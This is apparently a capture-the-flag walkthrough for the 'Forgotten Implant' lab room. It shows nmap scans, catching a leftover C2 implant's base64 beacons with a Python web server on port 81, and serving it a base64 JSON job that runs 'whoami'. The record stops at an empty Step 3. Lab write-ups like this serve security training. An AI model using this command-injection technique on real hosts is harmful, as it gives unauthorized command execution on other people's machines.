# Room: Forgotton Implant
> #### Difficulty: Medium
<i>With almost no attack surface, you must use a forgotten C2 implant to get initial access.</i>
### Description

<blockquote>
Welcome to Forgotten Implant! 

This is a pretty straightforward CTF-like room in which you will have to get initial access before elevating your privileges. The initial attack surface is quite limited, and you'll have to find a way of interacting with the system.

If you have no prior knowledge of Command and Control (C2), you might want to look at the Intro to C2 room. While it is not necessary to solve this challenge, it will provide valuable context for your learning experience.

Please allow 3-5 minutes for the VM to boot properly!

Note: While being very linear, this room can be solved in various ways. To get the most out of it, feel free to overengineer your solution to your liking!
</blockquote>

#### What To Do:
Step 1:
###### Do a simple nmap scan(port scan).
```
nmap <target-ip>
```
###### Output:
```
Nmap scan report for 10.10.59.154
Host is up (0.17s latency).
All 1000 scanned ports on 10.10.59.154 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Nmap done: 1 IP address (1 host up) scanned in 13.38 seconds
```
###### Wow🤨 no ports. Ok now lets do another nmap scan, its probably blocking ping scans.
```
nmap -Pn <target-ip>
```
###### What the... 👀 Still no common open portss?? Lets run wireshark to see the responses from nmap while scanning otherwise we going to waste our time.
```
nmap <target-ip>
```
###### Wireshark Result:
![image](https://github.com/solocyberengineer/MrBud-Home/assets/90530825/05a19a2d-4ea8-421c-832d-99d164fd7b00)
###### Interesting😲... No RST packet on port 81, but there is just a SYN packet, Trying to make a Connection to my machine😕?? Is that how C2C(command and control) is used😕??
###### I actually went to go research abit out C2C or C2 after this to get its functioning. I concluded it was somewhat like a backdoor where I could possibly give it commands or some status it requires/requests.
###### Lets try to run a simple HTTP server on port 81
```
sudo python3 -m http.server 81
```
###### Wow, we see Some Interesting things.
```
10.10.59.154 - - [01/Aug/2023 09:41:03] code 404, message File not found
10.10.59.154 - - [01/Aug/2023 09:41:03] "GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDFUMDc6NDE6MDIuMzc3MTE5IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1" 404 -
10.10.59.154 - - [01/Aug/2023 09:41:05] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 200 -
10.10.59.154 - - [01/Aug/2023 09:41:05] code 404, message File not found
```
###### It looks like its requesting base64 encoded files, Lets try to decode it and make out what it says.
```
echo 'eyJ0aW1lIjogIjIwMjMtMDgtMDFUMDc6NDE6MDIuMzc3MTE5IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9' | base64 -d
```
```
echo 'ImxhdGVzdCI=' | base64 -d 
```
###### Output:
```
{"time": "2023-08-01T07:41:02.377119", "systeminfo": {"os": "Linux", "hostname": "forgottenimplant"}, "latest_job": {"job_id": 0, "cmd": "whoami"}, "success": false}
```
```
"latest"
```
###### Interesting😲...

Step 2:
###### Inorder to get foothold we have to understand abit about Json encoding and abit about HTTP request headers. As in the previous step we can see the C2 is sending a HTTP request to us using the method GET. The below is one of them.
```
GET /get-job/ImxhdGVzdCI= HTTP/1.1
```
###### What you want to do is, create a folder with that base64 names file in it and in the file the contents should be a job since its requesting in folder "/get-job/"
```
mkdir ./get-job/
```
```
touch 'get-job/ImxhdGVzdCI='
```
###### Now what you want to do is, send it a json response giving it a job👷‍♂️.
```
echo '{"job_id": 0, "cmd": "whoami"}' > get-job/ImxhdGVzdCI=
```
###### Now run the server(make sure you not in the get-job folder otherwise your server will give respond with 404).
```
sudo python3 -m http.server 81
```
###### Output:
```
...
10.10.59.154 - - [01/Aug/2023 10:09:05] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ== HTTP/1.1" 404 -
```
###### Decode the base64👷‍♂️.<br>Output:
```
{"success": false, "result": "Encoding error"}
```
###### Wow😲. It will probably make sense to respond back in base64, lets try.
```
echo $(cat 'get-job/ImxhdGVzdCI=' | base64) > 'get-job/ImxhdGVzdCI='
```
###### Restart the server for clarity and wait for it to request.<br>Output:
```
10.10.59.154 - - [01/Aug/2023 10:20:04] "GET /job-result/eyJqb2JfaWQiOiAwLCAiY21kIjogIndob2FtaSIsICJzdWNjZXNzIjogdHJ1ZSwgInJlc3VsdCI6ICJhZGFcbiJ9 HTTP/1.1" 404 -
```
######  Decode Base64.<br>Output:
```
{"job_id": 0, "cmd": "whoami", "success": true, "result": "ada\n"}
```
###### Congratulations🥳, You have Achieved foothold!!!

Step 3:


